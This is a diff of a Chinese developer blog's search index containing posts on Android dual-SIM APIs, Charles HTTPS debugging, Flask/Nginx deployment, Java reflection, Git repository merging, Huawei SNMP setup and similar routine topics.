-    <content type="text"><![CDATA[在 Android 5.0 以前，各芯片厂商上的双卡开发没有一个统一的标准，以至于做起双卡适配来十分麻烦。Android 5.0 之后，Google 官方统一了双卡平台的适配，并在 Framework 中添加了双卡相关的 API，这对于需要处理双卡的应用来说提供了很大的便利。 因为 Android 5 上的双卡 API 还不是很完善所以本文是介绍在 Android 6.0 平台上的双卡相关开发后续还会有一篇文章来介绍在双卡处理 Android N 上的实现 言归正题在 API 层面上，自 Android 5.0 开始，加入了 SubscriptionManager。双卡相关的处理主要是依赖这个 API，你可以通过 Context 类里面的 getSystemService 方法和 SubscriptionManager.from(Context) 来取得它的对象，当然它内部也是调用的 getSystemService。 在数据库方面，TelephonyProvider 的 telephony.db 中新增了 siminfo 表来管理双卡的信息 由于字段太多，我这里只截图了几个关键的字段需要注意的是 _id 和 sim_id 这两个字段_id: 这个不用多说，系统要求，自增长，从 0 开始sim_id：该行的卡所在的卡槽值，有 0，1，-1 三个值| 数值 | 描述 || :–: |:—————————:|| 0 | 该卡插在卡槽 1 中（主卡槽） || 1 | 该卡插在卡槽 2 中（副卡槽） || -1 | 手机内曾经插入过该卡 |Ps. 在 Android 6.0+，-1 值已经被移除 每插入一张新的 SIM 卡，siminfo 表中就会插入一行新的数据，然后 _id 会自增长加 1 详细的各个 API 可以去查阅 API 文档。我这里仅以获取双卡手机两个卡的 IMSI 为例，介绍一下各平台所使用的方法SubId 这个值对于双卡相关的操作来说是必要的 Android 6.0： 1234567891011// 返回当前手机所插入 SIM 卡的个数TelePhonyManager.getPhoneCount()SubscriptionManager subManager = SubscriptionManager.from(this);// 这个方法传进手机的卡槽序号，返回对应所插 SIM 卡的信息SubscriptionInfo info = subManager.getActiveSubscriptionInfoForSimSlotIndex(1);int subId = info.getSubscriptionId();// 该方法在 Android 6.0 中还是 @hide 状态，可以反射调用TelephonyManager teleManager = getSystemService(TelephonyManager.class);String imsi = teleManager.getSubscriberId(subId); MTK： 12345678910111213141516171819try &#123; TelephonyManager teleManager = getSystemService(TelephonyManager.class); Class&lt;?&gt; phoneClass = Class.forName("com.android.internal.telephony.Phone"); Field gemni1Field = phoneClass.getField("GEMINI_SIM_1"); Field gemni2Field = phoneClass.getField("GEMINI_SIM_2"); gemni1Field.setAccessible(true); gemni2Field.setAccessible(true); int simId1 = (int) gemni1Field.get(null); int simId2 = (int) gemni2Field.get(null); Method method = TelephonyManager.class.getDeclaredMethod("getSubscriberIdGemini", int.class); String imsi1 = (String) method.invoke(teleManager, simId1); String imsi2 = (String) method.invoke(teleManager, simId2);&#125; catch (Exception e) &#123; e.printStackTrace();&#125; 高通： 1234567891011121314try &#123; Class&lt;?&gt; msmTeleManager = Class.forName("android.telephony.MSimTelephonyManager"); Method method = msmTeleManager.getMethod("getSubscriberId", int.class); int simId1 = 0; int simId2 = 1; Object phoneMsim = getSystemService("phone_msim"); String imsi1 = (String) method.invoke(phoneMsim, simId1); String imsi2 = (String) method.invoke(phoneMsim, simId2);&#125; catch (Exception e) &#123; e.printStackTrace();&#125; 对比三种获取双卡 IMSI 的方式，可以看出 Android 原生支持的双卡 API 更加的规范标准。目前新出的 Android 5+ 的新机上基本都采用了原生 API，Android 的碎片化又缩小了一步]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[解决 Xshell SSH 连接 Linux 中文乱码]]></title>
-    <url>%2F2017%2F04%2F29%2Fxshell-ssh-chinaese-utf8%2F</url>
-    <content type="text"><![CDATA[0x0首先需要确保你的 Xshell 的连接编码是 UTF-8。虽然可以修改 Linux 端的字符集去迎合 Windows 端做到中文的正常显示，但在当前 I18N 的大环境下，还是尽量用 UTF-8 吧。 打开 Xshell 的会话属性窗口，在左边选择到 终端，编码一项内，如果不是 Unicode 的话请改成 Unicode 0x2不出意外的话，重新连接你的 SSH 应该已经能正常显示中文了，因为大部分 Linux 的默认连接编码就是 UTF-8 的。 如果还是不能正常显示，你需要这样做修改 /etc/profile 这个文件在其中添加 1export LC_ALL="zh_CN.UTF-8" 这条命令的意思是设置 Locale 为 UTF-8，会在用户初始化时执行 重启系统，这里中文已经能正常显示了]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[CentOS 7 + Python Flask + MySQL + Nginx 配置]]></title>
-    <url>%2F2017%2F04%2F14%2Fcentos-python-flask-nginx%2F</url>
-    <content type="text"><![CDATA[不是很常用，算是给自己留个记录吧部分资料参考自网络 0.切换到 root 用户 1sudo su 1.安装并启动 Nginx 123yum install nginxsystemctl start nginx.service # 开启 nginx 服务systemctl enable nginx.service # 跟随系统启动 此时使用 localhost 应该会出现 Welcome to nginx 的欢迎页面了 2.安装并启动 MySQL（这里我用的是 MariaDB，就是 MySQL 换个壳，没多大区别…） 123yum install mariadb-server mariadbsystemctl start mariadb # 开启 mysql 服务systemctl enable mariadb # 跟随系统启动 3.初始化 MySQL 安全策略 1mysql_secure_installation 会提示输入 root 密码，默认为空，直接回车即可然后就问是否重新设置 root 密码，当然是要重新设置的啦。设置完后还有几个问题都输入 y 同意就行了 4.安装并配置 Python 和 pip 1yum install python34 # 安装 3.4.x 版本 由于 CentOS 自带了 Python 2.7 的版本，所以某些情况下，直接替换掉原始的版本可能出现未知问题，比如 yum 没法用之类的，就需要手动去 /usr/bin/python 修改链接关系，使其正确链接到 Python2，可用 ls -l 命令检查，这里我上一张正确的连接图后面执行命令的时候我将会用 Python3 来执行，python3 xxx 5.安装 pip，Gunicorn 和 flask 123yum install python34-pip # 安装 pippip3 install flaskpip3 install gunicorn 6.配置 Flask编写文件 /home/web/api/api.py 123456789101112from flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello World!'if __name__ == '__main__': app.run() 7.使用 Gunicorn 启动项目 12345678910111213gunicorn -D -w 3 -b 127.0.0.1:8000 api:app注意要在项目根目录下执行这条命令-D 后台运行 -w 启动 3 个工作线程-b 指定 IP 和端口号最后的那个 api:appapi 就是那个 Python 文件的名称（不包括后缀/模块名）app 就是 Flask 实例的名称可参见上文 api.py 的代码 可以使用 ps -aux 命令查看系统运行的进程同样，你也可以使用 kill [PID] 来关闭 Gunicorn 的进程 8.配置 Nginx主要就是配置 nginx 目录，这里我以 api 为例 1vim /etc/nginx/conf.d/api.conf 12345678910server &#123; listen 80; server_name api.iacn.me; # 外部域名 location / &#123; proxy_pass http://127.0.0.1:8000; # 反向代理 Gunicorn 本地的服务地址 proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 保存好然后重启 Nginx 1systemctl restart nginx 9.可以查看一下端口信息 10.已经可以从外部访问了]]></content>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Java 反射获取类所实现接口的泛型实际值]]></title>
-    <url>%2F2017%2F03%2F28%2Fjava-interface-generic-value%2F</url>
-    <content type="text"><![CDATA[1.有三个类 TestClass （Main 方法所在类）TempClass （测试用的类）TempClass$InnerClass （测试用 TempClass 的内部类） 2.三个类的代码如下 123456public class TestClass &#123; public static void main(String[] args) &#123; // TODO:实现过程一会在这儿写 &#125;&#125; 1234567891011public class TempClass &#123; // 随便找了个需要泛型的接口实现了2333 class InnerClass implements Comparable&lt;String&gt; &#123; @Override public int compareTo(String o) &#123; return 0; &#125; &#125;&#125; 3.实现过程首先，获取 TempClass 的内部类 InnerClass 12Class&lt;?&gt;[] classes = TempClass.class.getDeclaringClass();Class&lt;?&gt; innerClass = classes[0]; API 简介（Class）： getClasses() ：获取该类的 public 内部类getDeclaredClasses() ：获取该类的所有内部类 然后，获取这个内部类所实现的接口 12Type[] types = innerClass.getGenericInterfaces();ParameterizedType type = (ParameterizedType) types[0]; API 简介（Class）： getGenericSuperclass() ：获取该类 Type 类型的父类getGenericInterfaces() ：获取该类所实现的 Type 类型的接口数组 之后，强转为 ParameterizedType 类型，调用其中的 getActualTypeArguments() 方法，该方法也是返回一个 Type 类型的数组，分别存储的是具体的运行时泛型类型。这里取第一个，强转为 Class 就是实际的值了。 最后，全部代码放上 12345678910111213public static void main(String[] args) &#123; // TODO:实现过程一会在这儿写 Class&lt;?&gt;[] classes = TempClass.class.getDeclaredClasses(); Class&lt;?&gt; innerClass = classes[0]; Type[] types = innerClass.getGenericInterfaces(); ParameterizedType type = (ParameterizedType) types[0]; Class&lt;?&gt; clazz = (Class&lt;?&gt;) type.getActualTypeArguments()[0]; System.out.println(clazz); &#125; 运行结果]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Windows10 删除多余的网络配置项]]></title>
-    <url>%2F2017%2F03%2F24%2Fwin10-delete-network-config%2F</url>
-    <content type="text"><![CDATA[1.Win + R 运行，输入 regedit，打开注册表编辑器2.找到下面两个键 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Profiles HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged 3.在这两个键的下面有一堆 Hash 值命名的目录 不需要哪个删除就是了 可以根据目录里面 ProfileName 的值来判断这个目录是属于哪个网络配置的 同样，如果需要修改网络配置的名字，也可以从这里修改 ProfileName 的值 修改注册表有一定风险，请一定要仔细]]></content>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Windows10 USB-To-Console 串口驱动 (x86 x64)]]></title>
-    <url>%2F2017%2F02%2F28%2Fwin10-usb-to-console%2F</url>
-    <content type="text"><![CDATA[最近将 Win10 更新到 14393，之前的 USB 转串口线一插上就蓝屏重启，费了好多功夫 Google 到了之前版本的驱动，试了试居然没事了，这里就分享下吧 下载地址：百度网盘 Step1. 进入 Step1 文件夹，安装 Setup.exe。如果成功，则无需进行第二步了。 Step2. 进入 Step2 文件夹，安装 CH341SER.EXE。不行的话再安装 HL-340.EXE。 Windows10 专业版 x64 测试通过。]]></content>
-      <tags>
-        <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Charles 抓包 Android 端 https]]></title>
-    <url>%2F2017%2F02%2F21%2Fcharles-https%2F</url>
-    <content type="text"><![CDATA[在阅读本文前，你应该已经会使用 Charles 进行 http 抓包。如果不会，请先掌握 http 抓包后再阅读本文 首先需要安装 Charles 的证书到手机端点击下图位置的 Save Charles Root Certificate 将会把证书文件导出，你需要选择一个导出位置 导出后将其移动到手机的内置存储，然后在 设置 - 安全 - 从存储设备安装 安装该证书（我的手机是 Android 原生 6.0 的 ROM，个别手机的位置可能不同） 需要注意的是，在安装时弹出的提示框中 凭据用途 一项，应该选择 WLAN 之后在 PC 端 Charles 的 SSL Proxying Settings 里 添加你想要抓包的链接的主机名 重新发起连接后，发现之前显示小锁图标的 https 请求已经可以正常抓取了 Ps.关于抓包中抓到的 connect 请求connect 是为了建立 http tunnel 而存在的。connect 是 http 众多方法中的其中一种，它跟 post、get、put、options 方法是并列的。但是它的使用场景很特殊，只有在受限制的网络环境中（防火墙、NAT、代理器）并且是 https 通信时，客户端会使用 http connect 请求代理服务器，代理服务器使用 connect 方法与目标服务器建立 http tunnel。通道建立后，客户端与服务器进行通信，代理服务器就像透明一样，只是接收、转发 tcp stream这个引用自 http://blog.csdn.net/wangjun5159/article/details/54142016，详细的可以查看原文]]></content>
-      <tags>
-        <tag>Android逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Android 多主题之 EditText]]></title>
-    <url>%2F2017%2F02%2F14%2Fmodify-edittext-color%2F</url>
-    <content type="text"><![CDATA[多主题的需求在很多 Android 应用中都有存在，实现方式也是多种多样。有以插件化方式实现的，也有以修改原生控件颜色的方式实现的。本文所写的就是以修改原生控件颜色的方式应用主题的，EditText 的修改。 然而，这个不是这么好做的。。QAQ首先查阅 EditText 的 API 文档，发现还是提供了两个方法的 使用 EditText.setBackgroundTintList(colorStateList) 可以设置 EditText 下划线的颜色 使用 EditText.setHighlightColor(color) 可以设置 EditText 选中文字后的高亮颜色 恩，改完后确实生效了 但是。。输入光标和光标控制滑块还是原来的颜色，反而不伦不类的了。。 于是查看 EditText 的源码，发现是在它的父类 —— TextView 中的 mEditor 这个对象中控制的，但是这个变量是 private 的，也没有提供公开的获得方法，无奈只好用反射了 1234567private static Field mEditor;private static void getEditorFieldFromReflect() &#123; if (mEditor == null) &#123; mEditor = ReflectUtils.getDeclaredField(TextView.class, "mEditor"); &#125;&#125; 为了让反射达到最大的性能，声明了一个静态属性 mEditor，并在它为 null 的时候才进行反射（下同） ReflectUtils 是一个自定义的反射工具类 再获取输入光标的 Field 对象 1234567private static Field mCursorDrawableRes;private static void getCursorFieldFromReflect() &#123; if (mCursorDrawableRes == null) &#123; mCursorDrawableRes = ReflectUtils.getDeclaredField(TextView.class, "mCursorDrawableRes"); &#125;&#125; 这样就获取了输入光标的原始 id，也就是 mCursorDrawableRes由于原始的 CursorDrawable，是存在于 Android Framework 中的 framework-res.apk 中的，所以这里用一种曲线救国的方式，先获取到他的 id，进而获取到 Drawable，然后通过 Android 5.0 新增的 Tint 方式渲染 Drawable 的颜色，再设置进去 实现代码如下 1234567891011private static void setCursorColor(EditText editText, int color, Object editor) throws Exception &#123; int cursorId = mCursorDrawableRes.getInt(editText); Drawable drawable = editText.getContext().getDrawable(cursorId); if (drawable != null) &#123; drawable.setTint(color); &#125; ReflectUtils.setObjectField(mEditor.getType(), "mCursorDrawable", editor, new Drawable[]&#123;drawable, drawable&#125;); &#125; 这样输入光标的颜色就修改完成了 之后就是光标控制滑块的颜色了查看源码，发现这个对应的是三个 Drawable 只是这些的 id 是在 EditText 里的。于是，故技重施，和 mCursorDrawableRes 一样 12345678910 private static void getSelectFieldFromReflect() &#123; if (mSelectHandleLeft == null || mSelectHandleRight == null || mSelectHandleCenter == null) &#123; Class&lt;?&gt; EditorClass = mEditor.getType(); mSelectHandleLeft = ReflectUtils.getDeclaredField(EditorClass, "mSelectHandleLeft"); mSelectHandleRight = ReflectUtils.getDeclaredField(EditorClass, "mSelectHandleRight"); mSelectHandleCenter = ReflectUtils.getDeclaredField(EditorClass, "mSelectHandleCenter"); &#125;&#125; 123456789private static void setSelectHandleColor(EditText editText, int color, Object editor) throws Exception &#123; Drawable leftDrawable = (Drawable) mSelectHandleLeft.get(editor); Drawable rightDrawable = (Drawable) mSelectHandleRight.get(editor); Drawable centerDrawable = (Drawable) mSelectHandleCenter.get(editor); updateSelectHandleColor(leftDrawable, "mTextSelectHandleLeftRes", editText, color); updateSelectHandleColor(rightDrawable, "mTextSelectHandleRightRes", editText, color); updateSelectHandleColor(centerDrawable, "mTextSelectHandleRes", editText, color);&#125; 最后做个 setColor 的封装 1234567891011121314151617public static void setColor(EditText editText, int color) &#123; setUnderlineColor(editText, color); setHighlightColor(editText, color); try &#123; getEditorFieldFromReflect(); getCursorFieldFromReflect(); getSelectFieldFromReflect(); Object editor = mEditor.get(editText); setCursorColor(editText, color, editor); setSelectHandleColor(editText, color, editor); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; 需要时直接 EditColorHelper.setColor(EditText, Color) 就可以了]]></content>
-      <tags>
-        <tag>Android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[华为交换机 SNMP 协议配置]]></title>
-    <url>%2F2017%2F02%2F01%2Fhuawei-switch-snmp-config%2F</url>
-    <content type="text"><![CDATA[SNMP 协议介绍：Simple Network Management 简单网络管理协议，是由 IETF 互联网工程任务组定义的一套网络管理协议。该协议基于简单网关监视协议，最初面向基于 IP 的网络管理所设计。利用 SNMP，一个管理工作站可以远程管理所有支持这种协议的网络设备，包括监视网络状态、修改网络设备配置、接收网络事件警告等 上面的这些定义都没什么用，简单说，SNMP 就是方便远程管理网络设备，不用维护人员到处跑的东西 在华为交换机上最简单的配置方式： 1.执行 1snmp-agent community read xxx 这个是设置一个 SNMP 的 Community，使用该 Community 连接交换机时，只可以读取该交换机的配置，不可写入。对应的可以把命令中的 read 换成 write，这样远程就可以通过 SNMP 协议去修改交换机配置了 2.再次执行 1snmp-agent sys-info version all 这个是设置该交换机支持的 SNMP 协议版本，一般有 V1, V2C, V3 这几个版本，最好设置成 all，这样就支持所有版本了，如果不设置这个，某些软件可能无法正常读取信息 3.这样一般就可以了]]></content>
-      <tags>
-        <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Windows 环境变量的设置是否需要重启]]></title>
-    <url>%2F2016%2F12%2F25%2Fwindows-set-env-variable%2F</url>
-    <content type="text"><![CDATA[最近从 Android Studio 导入一个项目，提示需要配置一个叫 ANDROID_SDK_HOME 的环境变量，然而 Google 的提示是建议我配置完之后重启，但是我实测配置之后没有重启也生效了，这是怎么回事呢？ 原来，环境变量就是属于 Windows 系统的一些预定义好的变量，其中分为用户变量和系统变量。用户变量只对当前设置环境变量的这个用户生效，系统变量则对整个系统生效。这些变量在用户登录时被设置，应用到系统里，对系统里运行的每一个程序都生效。 在一个程序启动的时候，它所可以读取的环境变量就会被复制到它所在的环境中。也就是说，每个程序在运行时都会拥有原始环境变量的一份复制体，不会受其他程序的影响。 所以结果就是，只要重新运行该程序，程序就会重新读取系统的环境变量，环境变量也就发生改变了。而如果修改的是系统要使用的环境变量，也就必须重启系统了。]]></content>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[一个团队里的 5 种人]]></title>
-    <url>%2F2016%2F12%2F17%2Ffive-men-in-the-team%2F</url>
-    <content type="text"><![CDATA[一个团队里，人分为 5 种人渣、人员、人手、人才、人物 人渣就是牢骚抱怨，无事生非，拉帮结派，挑起事端、吃里扒外的破坏分子 人员就是只领工资不爱做事，安排与自己无关的工作不愿干，属庸人之列 人手就是安排什么做什么，不安排绝对不做，等着下命令的人 人才就是每天发自内心做事，做事有责任、有思路、有条理，知道公司的事做好了，受益的是自己，同时真心为公司操心的人 人物就是全身心投入，用灵魂去思考、做事，决心要和老板做一番事业的人 人员斤斤计较，人手需要引导，人才关注当下，人物放眼未来！ 发展靠人才，做大靠人物！ 通常人渣有可能鱼目混珠地苟存在大团队、大机构中，小团队里很容易一眼就看到，没法混。而人员、人手、人才是主体，人物可遇不可求 任何团队都必须同心协力才能共赢发展，彼此促进，水涨船高]]></content>
+    <title>一个团队里的 5 种人</title>
+    <url>/2016/12/17/five-men-in-the-team/</url>
+    <content><![CDATA[<p>一个团队里，人分为 5 种<br>人渣、人员、人手、人才、人物</p>
+<p><strong>人渣</strong><br>就是牢骚抱怨，无事生非，拉帮结派，挑起事端、吃里扒外的破坏分子</p>
+<p><strong>人员</strong><br>就是只领工资不爱做事，安排与自己无关的工作不愿干，属庸人之列</p>
+<p><strong>人手</strong><br>就是安排什么做什么，不安排绝对不做，等着下命令的人</p>
+<p><strong>人才</strong><br>就是每天发自内心做事，做事有责任、有思路、有条理，知道公司的事做好了，受益的是自己，同时真心为公司操心的人</p>
+<p><strong>人物</strong><br>就是全身心投入，用灵魂去思考、做事，决心要和老板做一番事业的人</p>
+<a id="more"></a>
+
+<p>人员斤斤计较，<br>人手需要引导，<br>人才关注当下，<br>人物放眼未来！ </p>
+<p>发展靠人才，做大靠人物！</p>
+<p>通常人渣有可能鱼目混珠地苟存在大团队、大机构中，小团队里很容易一眼就看到，没法混。而人员、人手、人才是主体，人物可遇不可求</p>
+<p>任何团队都必须同心协力才能共赢发展，彼此促进，水涨船高</p>
+]]></content>
       <tags>
         <tag>闲聊</tag>
         <tag>转</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[合并两个 Git 仓库]]></title>
-    <url>%2F2016%2F11%2F16%2Fmerge-git-repo%2F</url>
-    <content type="text"><![CDATA[本应在 /Project 下的 Git 根目录成了 /Project/app … 12345678.└── Project ├── app │ ├── xxx6.txt │ ├── xxx7.txt │ └── xxx8.txt ├── xxx1.txt └── xxx2.txt 就是这个样子，Git 的根目录成了 /app ，而需要的是 /Project ，但是 app 又是 Project 的子目录，想迁移过去又不想丢失 Commit 数据… 简单点说就是有 2 个 Git 仓库：repo1 和 repo2repo1 是 repo2 的子目录想要把 repo1 中的文件移入 repo2repo1 的 Commit 记录要保留 当前文件结构如下 12345.└── repo2 ├── repo1 ==============&gt; Git 仓库 │ └── repo1.txt └── repo2.txt 想要的结果是 12345.└── repo2 ==============&gt; Git 仓库 ├── repo1 │ └── repo1.txt └── repo2.txt 开始 新建 repo1 子目录，将原 /repo1 的文件移动至 /repo1/repo1 cd repo1mkdir repo1find -maxdepth 1 -not -name . -not -name repo1 -not -name .git -exec mv {} ./repo1 ; 目录结构变成 12345.├── repo1│ └── repo1│ └── repo1.txt└── repo2.txt 在 repo1 Git 提交刚才的操作 在 repo2 中 将 repo1 作为远程仓库，添加进来，设置别名为 temp cd ../repo2git remote add temp ../repo1/ 从 repo1 中抓取数据到当前 repo2 仓库 git fetch temp 将 repo1 中抓来的 master 分支作为新分支 checkout 到本地，新分支名命名为 repo1 git checkout -b repo1 temp/master 切换回 repo2 的 master 分支，并将 repo1 分支合并到 master git checkout mastergit merge repo1 删除 repo1 分支和远程地址 temp git branch -d repo1git remote remove temp 这样就可以了。大致思路就是伪造远程 repo1 仓库为 repo2 的一个分支，然后合并进来]]></content>
+    <title>Charles 抓包 Android 端 https</title>
+    <url>/2017/02/21/charles-https/</url>
+    <content><![CDATA[<ol>
+<li><p>在阅读本文前，你应该已经会使用 Charles 进行 http 抓包。如果不会，请先掌握 http 抓包后再阅读本文</p>
+<a id="more"></a>
+</li>
+<li><p>首先需要安装 Charles 的证书到手机端<br>点击下图位置的 Save Charles Root Certificate 将会把证书文件导出，你需要选择一个导出位置<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcb4bb8.png" alt="1.png"><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd05e86.png" alt="2.png"></p>
+</li>
+<li><p>导出后将其移动到手机的内置存储，然后在 <strong>设置 - 安全 - 从存储设备安装</strong> 安装该证书<br>（我的手机是 Android 原生 6.0 的 ROM，个别手机的位置可能不同）<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c2d282.png" alt="3.png"></p>
+</li>
+<li><p>需要注意的是，在安装时弹出的提示框中 <strong>凭据用途</strong> 一项，应该选择 <strong>WLAN</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e47c411e0.png" alt="4.png"></p>
+</li>
+<li><p>之后在 PC 端 Charles 的 SSL Proxying Settings 里 <strong>添加你想要抓包的链接的主机名</strong><br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bd44721.png" alt="5.png"></p>
+</li>
+</ol>
+<ol start="6">
+<li>重新发起连接后，发现之前显示小锁图标的 https 请求已经可以正常抓取了<br><img src="https://ooo.0o0.ooo/2017/02/17/58a6e1bcc9402.png" alt="6.png"></li>
+</ol>
+<p>Ps.关于抓包中抓到的 connect 请求<br>connect 是为了建立 http tunnel 而存在的。connect 是 http 众多方法中的其中一种，它跟 post、get、put、options 方法是并列的。但是它的使用场景很特殊，只有在受限制的网络环境中（防火墙、NAT、代理器）并且是 https 通信时，客户端会使用 http connect 请求代理服务器，代理服务器使用 connect 方法与目标服务器建立 http tunnel。通道建立后，客户端与服务器进行通信，代理服务器就像透明一样，只是接收、转发 tcp stream<br>这个引用自 <a href="http://blog.csdn.net/wangjun5159/article/details/54142016" target="_blank" rel="noopener">http://blog.csdn.net/wangjun5159/article/details/54142016</a>，详细的可以查看原文</p>
+]]></content>
+      <tags>
+        <tag>Android逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java 反射获取类所实现接口的泛型实际值</title>
+    <url>/2017/03/28/java-interface-generic-value/</url>
+    <content><![CDATA[<p>1.有三个类</p>
+<blockquote>
+<p>TestClass （Main 方法所在类）<br>TempClass （测试用的类）<br>TempClass$InnerClass （测试用 TempClass 的内部类）</p>
+</blockquote>
+<p>2.三个类的代码如下</p>
+<a id="more"></a>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span>实现过程一会在这儿写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TempClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 随便找了个需要泛型的接口实现了2333</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(String o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.实现过程<br>首先，获取 TempClass 的内部类 InnerClass</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] classes = TempClass.class.getDeclaringClass();</span><br><span class="line">Class&lt;?&gt; innerClass = classes[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>API 简介（Class）：</p>
+<p>getClasses() ：获取该类的 public 内部类<br>getDeclaredClasses() ：获取该类的所有内部类</p>
+</blockquote>
+<p>然后，获取这个内部类所实现的接口</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Type[] types = innerClass.getGenericInterfaces();</span><br><span class="line">ParameterizedType type = (ParameterizedType) types[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>API 简介（Class）：</p>
+<p>getGenericSuperclass() ：获取该类 Type 类型的父类<br>getGenericInterfaces() ：获取该类所实现的 Type 类型的接口数组</p>
+</blockquote>
+<p>之后，强转为 ParameterizedType 类型，调用其中的 <strong>getActualTypeArguments()</strong> 方法，该方法也是返回一个 Type 类型的数组，分别存储的是具体的运行时泛型类型。这里取第一个，强转为 Class 就是实际的值了。</p>
+<p>最后，全部代码放上</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span>实现过程一会在这儿写</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt;[] classes = TempClass.class.getDeclaredClasses();</span><br><span class="line">        Class&lt;?&gt; innerClass = classes[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Type[] types = innerClass.getGenericInterfaces();</span><br><span class="line">        ParameterizedType type = (ParameterizedType) types[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = (Class&lt;?&gt;) type.getActualTypeArguments()[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果<br><img src="https://ooo.0o0.ooo/2017/03/28/58da35e0ef6a7.png" alt="snipaste20170328_180648.png"></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>泉城公交开发手记（一） 说明</title>
+    <url>/2018/01/07/jinan-bus-note1/</url>
+    <content><![CDATA[<p>泉城公交是我在 2015 年的时候开发的一个济南公交第三方客户端，基本实现了原生济南公交客户端的部分功能。但出于一些原因，不得不停止更新。我将所有源代码开源在了 GitHub。然后有网友邮件询问相关问题，所以，我整理了一下以前开发时的一些笔记，整理成几篇文章发出来。</p>
+<a id="more"></a>
+
+<p>这几篇文章大概分为以下几个部分<br>API 分析、通知模块实现、自定义线路图 View 等等，还有部分填坑的说明。路线规划不会写，因为这部分整个就是调用的百度离线地图 SDK。</p>
+<p>如果时间充裕的话，可能还会写一写济南公交（微步、369出行）新版的 NFC 公交卡充值实现。</p>
+<p>本系列文章仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与作者无关。</p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>华为交换机 SNMP 协议配置</title>
+    <url>/2017/02/01/huawei-switch-snmp-config/</url>
+    <content><![CDATA[<p>SNMP 协议介绍：Simple Network Management 简单网络管理协议，是由 IETF 互联网工程任务组定义的一套网络管理协议。该协议基于简单网关监视协议，最初面向基于 IP 的网络管理所设计。利用 SNMP，一个管理工作站可以远程管理所有支持这种协议的网络设备，包括监视网络状态、修改网络设备配置、接收网络事件警告等</p>
+<p>上面的这些定义都没什么用，简单说，SNMP 就是方便远程管理网络设备，不用维护人员到处跑的东西</p>
+<a id="more"></a>
+
+<p>在华为交换机上最简单的配置方式：</p>
+<p>1.执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmp-agent community read xxx</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个是设置一个 SNMP 的 Community，使用该 Community 连接交换机时，只可以读取该交换机的配置，不可写入。对应的可以把命令中的 <strong>read</strong> 换成 <strong>write</strong>，这样远程就可以通过 SNMP 协议去修改交换机配置了</p>
+</blockquote>
